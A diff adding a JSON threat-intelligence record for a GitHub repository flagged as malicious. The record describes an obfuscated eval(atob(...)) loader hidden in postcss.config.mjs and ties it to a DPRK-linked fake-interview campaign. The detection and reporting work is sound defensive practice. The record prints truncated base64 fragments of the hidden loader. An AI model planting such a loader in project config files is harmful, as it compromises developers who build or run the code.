@@ -1,0 +1,82 @@
+{
+  "finding": {
+    "key": "repository:haroontaufiq/cosmic-questionnaire",
+    "kind": "repository",
+    "family": "",
+    "id": "haroontaufiq/cosmic-questionnaire",
+    "url": "https://github.com/HaroonTaufiq/cosmic-questionnaire",
+    "registry": "github",
+    "owner": "haroontaufiq",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob",
+    "evidence_locations": "postcss.config.mjs:9; postcss.config.mjs:11",
+    "c2_hosts": "",
+    "iocs": "postcss.config.mjs",
+    "matched_signatures": "Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm",
+    "reasons": "Shares a confirmed-malware code signature ['Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "38e9b500-fd1b-4b32-adc7-f9de4c2bb0be",
+    "first_seen": "hunt-20260620T052811Z",
+    "last_seen": "hunt-20260620T052811Z",
+    "evidence_file": "repositories/haroontaufiq_cosmic-questionnaire.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "postcss.config.mjs",
+      "line": 9,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-89"
+    },
+    {
+      "file": "postcss.config.mjs",
+      "line": 11,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqI"
+    },
+    {
+      "file": "postcss.config.mjs",
+      "line": 9,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-89"
+    },
+    {
+      "file": "postcss.config.mjs",
+      "line": 11,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqI"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/haroontaufiq/cosmic-questionnaire",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in postcss.config.mjs.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: postcss.config.mjs\n- postcss.config.mjs:9: decodes a hidden blob and executes it at load time (obfuscated loader) (+1 more)\n- postcss.config.mjs:9: hides code in an encoded blob that is decoded and run (+1 more)",
+    "publisher": "haroontaufiq",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/haroontaufiq/cosmic-questionnaire/blob/HEAD/postcss.config.mjs#L9\nhttps://github.com/haroontaufiq/cosmic-questionnaire/blob/HEAD/postcss.config.mjs#L11",
+    "verified_iocs": "postcss.config.mjs",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:28:11Z",
+    "last_seen": "2026-06-20T05:28:11Z"
+  }
+}
